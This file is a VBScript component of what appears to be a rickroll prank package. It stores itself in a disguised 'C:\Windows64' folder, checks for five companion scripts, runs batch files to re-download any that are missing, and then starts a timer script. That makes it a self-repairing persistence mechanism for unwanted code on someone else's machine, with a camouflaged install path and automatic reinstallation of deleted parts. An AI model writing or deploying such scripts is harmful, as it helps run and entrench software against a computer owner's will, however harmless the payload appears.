Option Explicit
Dim WshShell, oShell, strHomeFolder, full, fso, file1, file2, file3, file4, file5, file6, batFolder, path, pat2, oExec, objShell, homefolder
Set WshShell = CreateObject("WScript.Shell")
Set oShell = CreateObject("WScript.Shell")
Set objShell = Wscript.CreateObject("WScript.Shell")
Set objShell = CreateObject("Wscript.Shell")
objShell.CurrentDirectory = "C:\"
'declare varibales
strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
homefolder = "C:\Windows64\rickroll\"
batFolder = "C:\Windows64\rickroll\missing\"
file1 = "C:\Windows64\rickroll\FileChecker.vbs"
file2 = "C:\Windows64\rickroll\Timer.vbs"
file3 = "C:\Windows64\rickroll\Video.vbs"
file4 = "C:\Windows64\rickroll\VolumeUp.vbs"
file5 = "C:\Windows64\rickroll\RickRoll.vbs"
file6 = "C:\Windows64\rr\CleanUp.vbs"

Function FileExists(FilePath)
    Set fso = CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(FilePath) Then
            FileExists=CBool(1)
        Else
            FileExists=CBool(0)
        End If
End Function

' Check for Timer Script if absent download it
do
    If FileExists(file2) Then
        file2 = true
    Else
        path = (batFolder + "DownloadTimer.bat")
        Set oExec = WshShell.Exec(path)
        Do While oExec.Status = 0
        WScript.Sleep 100
        Loop
    end If
Loop Until file2 = true

' Check for Video Script if absent download it
do
    If FileExists(file3) Then
        file3 = true
    Else
        path = (batFolder + "DownloadVideo.bat")
        Set oExec = WshShell.Exec(path)
        Do While oExec.Status = 0
        WScript.Sleep 100
        Loop
    end If
Loop Until file3 = true

' Check for VolumeUp Script if absent download it
do
    If FileExists(file4) Then
        file4 = true
    Else
        path = (batFolder + "DownloadVolumeUp.bat")
        Set oExec = WshShell.Exec(path)
        Do While oExec.Status = 0
        WScript.Sleep 100
        Loop
    end If
Loop Until file4 = true

' Check for RickRoll Script if absent download it
do
    If FileExists(file5) Then
        file5 = true
    Else
        path = (batFolder + "DownloadRickRoll.bat")
        Set oExec = WshShell.Exec(path)
        Do While oExec.Status = 0
        WScript.Sleep 100
        Loop
    end If
Loop Until file5 = true


' Check for Cleanup Script if absent download it
do
    If FileExists(file6) Then
        file6 = true
    Else
        path = (batFolder + "DownloadCleanUp.bat")
        Set oExec = WshShell.Exec(path)
        Do While oExec.Status = 0
        WScript.Sleep 100
        Loop
    end If
Loop Until file6 = true


' final check for all files. Start Timer if all files exist
if file2 = true then
    if file3 = true then
        if file4 = true then
            if file5 = true then
                if file6 = true then
                    objShell.Run "C:\Windows64\rickroll\Timer.vbs"
                end if
            end if
        end if
    end If
end If